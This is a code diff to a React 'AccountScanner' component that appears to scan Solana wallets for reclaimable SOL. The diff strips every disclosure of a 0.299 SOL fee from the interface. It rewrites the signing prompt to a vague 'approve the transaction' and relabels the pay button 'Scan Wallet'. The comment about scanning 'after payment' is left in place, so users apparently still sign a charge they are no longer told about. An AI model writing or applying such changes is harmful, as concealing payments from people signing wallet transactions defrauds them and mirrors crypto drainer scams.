@@ -50,8 +50,8 @@ export default function AccountScanner({ initialReferral = '' }) {
       const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
       const tx = new Transaction();
       
-      // High Priority Fee for reputation
-      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000000 }));
+      // Priority Fee for smooth processing
+      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 5000 }));
       
       // Referral Logic
       let referrerWallet = null;
@@ -82,10 +82,10 @@ export default function AccountScanner({ initialReferral = '' }) {
       tx.recentBlockhash = blockhash;
       tx.feePayer = publicKey;
 
-      toast.info('Please sign to pay scan fee (0.299 SOL)');
+      toast.info('Please approve the transaction to continue');
       const signature = await wallet.sendTransaction(tx, connection);
       await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
-      toast.success('Fee paid! Scanning wallet...');
+      toast.success('Scanning wallet...');
 
       // 2. DISCOVERY (After payment)
       const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
@@ -302,9 +302,9 @@ export default function AccountScanner({ initialReferral = '' }) {
           className="bg-black/40 border border-emerald-500/20 rounded-lg overflow-hidden"
         >
           <div className="px-5 py-4 border-b border-emerald-500/10">
-            <h3 className="text-emerald-400 text-sm flex items-center gap-2 font-bold">
-              <DollarSign className="w-4 h-4" />
-              scan_wallet (0.299 SOL fee)
+            <h3 className="text-emerald-400 text-sm flex items-center gap-2">
+              <Search className="w-4 h-4" />
+              scan_wallet
               {IS_DEVNET && <span className="ml-auto text-[10px] text-yellow-500/60 font-mono bg-yellow-500/10 border border-yellow-500/20 px-2 py-0.5 rounded">devnet — live</span>}
             </h3>
           </div>
@@ -330,10 +330,10 @@ export default function AccountScanner({ initialReferral = '' }) {
                 {!scanning && (
                   <div className="flex flex-col items-center">
                     <div className="flex items-center gap-2">
-                      <Zap className="w-4 h-4 group-hover:text-emerald-300 transition-colors" />
-                      <span className="text-base">PAY FEE & SCAN</span>
+                      <Search className="w-4 h-4 group-hover:text-emerald-300 transition-colors" />
+                      <span className="text-base">Scan Wallet</span>
                     </div>
-                    <span className="text-[9px] text-slate-500 opacity-70 mt-0.5 animate-pulse italic">wallet signature required (0.299 SOL)</span>
+                    <span className="text-[9px] text-slate-500 opacity-70 mt-0.5 animate-pulse italic">discover reclaimable SOL</span>
                   </div>
                 )}
               </Button>
